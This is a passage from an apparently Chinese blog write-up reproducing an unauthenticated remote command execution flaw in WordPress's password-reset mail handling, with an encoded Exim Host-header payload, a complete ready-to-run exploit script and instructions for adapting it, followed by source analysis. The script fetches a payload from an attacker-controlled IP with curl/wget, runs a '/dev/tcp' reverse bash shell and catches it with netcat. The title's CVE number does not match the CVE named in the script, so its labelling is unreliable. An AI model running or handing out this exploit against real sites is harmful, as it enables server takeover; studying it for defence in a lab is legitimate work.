<pre class="line-numbers language-none"><code class="language-none">aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png)</p>
<h2 id="0x05-POC">0x05 POC</h2>
<p>自动化提交 payload，获取反弹 shell。通过 <code>python -mSimpleHTTPServer</code> 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。</p>
<p>使用方法<br>
攻击机上运行./exp.sh [<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>](<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>)即可 其中xx.xx.xx.xx为靶机wordpress的根地址</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token comment">#</span>
<span class="token comment">#      __                     __   __  __           __</span>
<span class="token comment">#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________</span>
<span class="token comment">#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span>
<span class="token comment">#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )</span>
<span class="token comment">#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/</span>
<span class="token comment">#            /____/</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span>
<span class="token comment"># CVE-2016-10033</span>
<span class="token comment">#</span>
<span class="token comment"># wordpress-rce-exploit.sh (ver. 1.0)</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># Discovered and coded by</span>
<span class="token comment">#</span>
<span class="token comment"># Dawid Golunski (@dawid_golunski)</span>
<span class="token comment"># https://legalhackers.com</span>
<span class="token comment">#</span>
<span class="token comment"># ExploitBox project:</span>
<span class="token comment"># https://ExploitBox.io</span>
<span class="token comment">#</span>
<span class="token comment"># Full advisory URL:</span>
<span class="token comment"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span>
<span class="token comment">#</span>
<span class="token comment"># Exploit src URL:</span>
<span class="token comment"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># Tested on WordPress 4.6:</span>
<span class="token comment"># https://github.com/WordPress/WordPress/archive/4.6.zip</span>
<span class="token comment">#</span>
<span class="token comment"># Usage:</span>
<span class="token comment"># ./wordpress-rce-exploit.sh target-wordpress-url</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># Disclaimer:</span>
<span class="token comment"># For testing purposes only</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment"># -----------------------------------------------------------------</span>
<span class="token comment">#</span>
<span class="token comment"># Interested in vulns/exploitation?</span>
<span class="token comment">#</span>
<span class="token comment">#</span>
<span class="token comment">#                        .;lc'</span>
<span class="token comment">#                    .,cdkkOOOko;.</span>
<span class="token comment">#                 .,lxxkkkkOOOO000Ol'</span>
<span class="token comment">#             .':oxxxxxkkkkOOOO0000KK0x:'</span>
<span class="token comment">#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.</span>
<span class="token comment">#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.</span>
<span class="token comment">#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.</span>
<span class="token comment">#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:</span>
<span class="token comment">#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:</span>
<span class="token comment">#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:</span>
<span class="token comment">#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:</span>
<span class="token comment">#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:</span>
<span class="token comment">#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:</span>
<span class="token comment">#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:</span>
<span class="token comment">#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:</span>
<span class="token comment">#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:</span>
<span class="token comment">#     .dxxxxxdl;. .,               .. .;cdxxxxxx:</span>
<span class="token comment">#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:</span>
<span class="token comment">#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.</span>
<span class="token comment">#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span>
<span class="token comment">#             .':oxxxxxxxxx.ckkkkkkkkxl,.</span>
<span class="token comment">#                 .,cdxxxxx.ckkkkkxc.</span>
<span class="token comment">#                    .':odx.ckxl,.</span>
<span class="token comment">#                        .,.'.</span>
<span class="token comment">#</span>
<span class="token comment"># https://ExploitBox.io</span>
<span class="token comment">#</span>
<span class="token comment"># https://twitter.com/Exploit_Box</span>
<span class="token comment">#</span>
<span class="token comment"># -----------------------------------------------------------------</span>
 
<span class="token assign-left variable">rev_host</span><span class="token operator">=</span><span class="token string">"124.220.233.26"</span>
 
<span class="token keyword">function</span> <span class="token function-name function">prep_host_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>
      <span class="token assign-left variable">rce_cmd</span><span class="token operator">=</span><span class="token string">"\<span class="token variable">${run{$cmd}</span>}"</span><span class="token punctuation">;</span>
 
      <span class="token comment"># replace / with ${substr{0}{1}{$spool_directory}}</span>
      <span class="token comment">#sed 's^/^${substr{0}{1}{$spool_directory}}^g'</span>
      <span class="token assign-left variable">rce_cmd</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> $rce_cmd <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s^/^\${substr{0}{1}{\$spool_directory}}^g'</span><span class="token variable">`</span></span>"</span>
 
      <span class="token comment"># replace ' ' (space) with</span>
      <span class="token comment">#sed 's^ ^${substr{10}{1}{$tod_log}}$^g'</span>
      <span class="token assign-left variable">rce_cmd</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> $rce_cmd <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s^ ^\${substr{10}{1}{\$tod_log}}^g'</span><span class="token variable">`</span></span>"</span>
      <span class="token comment">#return "target(any -froot@localhost -be $rce_cmd null)"</span>
      <span class="token assign-left variable">host_header</span><span class="token operator">=</span><span class="token string">"target(any -froot@localhost -be <span class="token variable">$rce_cmd</span> null)"</span>
      <span class="token builtin class-name">return</span> <span class="token number">0</span>
<span class="token punctuation">}</span>
 
<span class="token comment">#cat exploitbox.ans</span>
<span class="token assign-left variable">intro</span><span class="token operator">=</span><span class="token string">"
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"</span>
<span class="token assign-left variable">intro2</span><span class="token operator">=</span><span class="token string">"
ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09
fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb
MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE
aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09
fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg
ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh
bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt
ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp
bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1
cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$intro</span>"</span>  <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$intro2</span>"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>
 
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Usage:<span class="token entity" title="\n">\n</span><span class="token variable">$0</span> target-wordpress-url<span class="token entity" title="\n">\n</span>"</span>
<span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>
<span class="token assign-left variable">target</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"<span class="token entity" title="\e">\e</span>[91m[*]<span class="token entity" title="\033">\033</span>[0m"</span>
<span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">" Sure you want to get a shell on the target '<span class="token variable">$target</span>' ? [y/N] "</span> choice
<span class="token builtin class-name">echo</span>
 
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$choice</span>"</span> <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
 
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\e">\e</span>[92m[*]<span class="token entity" title="\033">\033</span>[0m Guess I can't argue with that... Let's get started...<span class="token entity" title="\n">\n</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\e">\e</span>[92m[+]<span class="token entity" title="\033">\033</span>[0m Connected to the target"</span>
 
<span class="token comment"># Serve payload/bash script on :80</span>
<span class="token assign-left variable">RCE_exec_cmd</span><span class="token operator">=</span><span class="token string">"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/<span class="token variable">$rev_host</span>/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RCE_exec_cmd</span>"</span> <span class="token operator">&gt;</span> rce.txt
python <span class="token parameter variable">-mSimpleHTTPServer</span> <span class="token number">80</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">&gt;</span><span class="token file-descriptor important">&amp;2</span> <span class="token operator">&amp;</span>
<span class="token assign-left variable">hpid</span><span class="token operator">=</span><span class="token variable">$!</span>
 
<span class="token comment"># Save payload on the target in /tmp/rce</span>
<span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"/usr/bin/curl -o/tmp/rce <span class="token variable">$rev_host</span>/rce.txt"</span>
prep_host_header <span class="token string">"<span class="token variable">$cmd</span>"</span>
<span class="token function">curl</span> -H<span class="token string">"Host: <span class="token variable">$host_header</span>"</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-d</span> <span class="token string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="token variable">$target</span>/wp-login.php?action<span class="token operator">=</span>lostpassword
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\e">\e</span>[92m[+]<span class="token entity" title="\e">\e</span>[0m Payload sent successfully"</span>
 
<span class="token comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
<span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="token string">"<span class="token variable">$cmd</span>"</span>
<span class="token function">curl</span> -H<span class="token string">"Host: <span class="token variable">$host_header</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="token variable">$target</span>/wp-login.php?action<span class="token operator">=</span>lostpassword <span class="token operator">&amp;</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\e">\e</span>[92m[+]<span class="token entity" title="\033">\033</span>[0m Payload executed!"</span>
 
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\e">\e</span>[92m[*]<span class="token entity" title="\033">\033</span>[0m Waiting for the target to send us a <span class="token entity" title="\e">\e</span>[94mreverse shell<span class="token entity" title="\e">\e</span>[0m...<span class="token entity" title="\n">\n</span>"</span>
<span class="token function">nc</span> <span class="token parameter variable">-nvv</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">5555</span>
<span class="token builtin class-name">echo</span>
<span class="token keyword">else</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\e">\e</span>[92m[+]<span class="token entity" title="\033">\033</span>[0m Responsible choice ;) Exiting.<span class="token entity" title="\n">\n</span>"</span>
<span class="token builtin class-name">exit</span> <span class="token number">0</span>
 
<span class="token keyword">fi</span>
 
<span class="token builtin class-name">echo</span> <span class="token string">"Exiting..."</span>
<span class="token builtin class-name">exit</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="脚本需要修改的部分">脚本需要修改的部分</h3>
<p>三个地方 第一处 #1 line 1</p>
<pre class="line-numbers language-none"><code class="language-none">rev_host="192.168.57.1" #1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。<br>
第二处 #2 line 75</p>
<p>第三处 #3 line 80</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H<span class="token string">"Host: <span class="token variable">$host_header</span>"</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-d</span> <span class="token string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="token variable">$target</span>/wp-login.php?action<span class="token operator">=</span>lostpassword <span class="token comment">#2</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\e">\e</span>[92m[+]<span class="token entity" title="\e">\e</span>[0m Payload sent successfully"</span>
<span class="token comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
<span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="token string">"<span class="token variable">$cmd</span>"</span>
<span class="token function">curl</span> -H<span class="token string">"Host: <span class="token variable">$host_header</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="token variable">$target</span>/wp-login.php?action<span class="token operator">=</span>lostpassword <span class="token operator">&amp;</span> <span class="token comment">#3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin<br>
这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱<br>
因为找回密码时他会先判断邮箱是否存在，再进行下一步<br>
如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在<br>
如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了<br>
下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功</p>
<p>![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png)</p>
<p>可以看到靶机上也确实出现了rce文件</p>
<p>这边执行的命令是<code>/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></p>
<p>![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png)</p>
<p>这三个地方改好了之后，脚本就可以运行了</p>
<h3 id="脚本的主要流程：">脚本的主要流程：</h3>
<blockquote>
<ol>
<li>生成本地rce.txt 里面写的是是建立连接的命令</li>
<li>命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下</li>
<li>命令执行第二次 运行tmp目录下的rce</li>
<li>nc连接靶机</li>
</ol>
</blockquote>
<h2 id="0x06-漏洞原理深入">0x06 漏洞原理深入</h2>
<p>将docker中的wordpress源码拷贝出来<code>sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code</code></p>
<p>根据忘记密码页面的url<code>wp-login.php?action=lostpassword</code>定位到<code>wp-login.php</code>的<code>retrieve_password</code>函数，此函数是对密码的操作函数。</p>
<p>此函数中对用户输入进行处理后，最后通过以下代码发送邮件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">retrieve_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token operator">...</span><span class="token operator">...</span>
        
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">apply_filters</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'retrieve_password_message'</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$user_login</span><span class="token punctuation">,</span> <span class="token variable">$user_data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">wp_mail</span><span class="token punctuation">(</span> <span class="token variable">$user_email</span><span class="token punctuation">,</span> <span class="token function">wp_specialchars_decode</span><span class="token punctuation">(</span> <span class="token variable">$title</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
		<span class="token function">wp_die</span><span class="token punctuation">(</span> <span class="token function">__</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'The email could not be sent.'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br /&gt;\n"</span> <span class="token operator">.</span> <span class="token function">__</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Possible reason: your host may have disabled the mail() function.'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>跟进<code>wp_mail</code>函数，定位到<code>/wp-includes/pluggable.php</code></p>
<p>函数中其中关于host的设置如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$from_name</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
		<span class="token variable">$from_name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'WordPress'</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$from_email</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// Get the site domain and get rid of www.</span>
		<span class="token variable">$sitename</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$sitename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'www.'</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token variable">$sitename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$sitename</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$from_email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'wordpress@'</span> <span class="token operator">.</span> <span class="token variable">$sitename</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$from_email</span> <span class="token operator">=</span> <span class="token function">apply_filters</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_mail_from'</span><span class="token punctuation">,</span> <span class="token variable">$from_email</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$from_name</span> <span class="token operator">=</span> <span class="token function">apply_filters</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_mail_from_name'</span><span class="token punctuation">,</span> <span class="token variable">$from_name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$phpmailer</span><span class="token operator">-&gt;</span><span class="token function">setFrom</span><span class="token punctuation">(</span> <span class="token variable">$from_email</span><span class="token punctuation">,</span> <span class="token variable">$from_name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据代码可以看出wordpress基于<code>$_SERVER['SERVER_NAME']</code>来构造<code>$from_email</code>发送邮件的域，前面拼接上<code>wordpress@</code></p>
<p><code>$_SERVER['SERVER_NAME']</code>参数是通过请求头<code>Host</code>字段传入，并且这里只是简单的使用<code>substr</code>去掉了前面的<code>www.</code>，没有任何过滤措施。</p>
<p>在docker中添加a.php代码来查看<code>$_SERVER['SERVER_NAME']</code>的值</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no value"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在下图中看到就是Host字段的值</p>
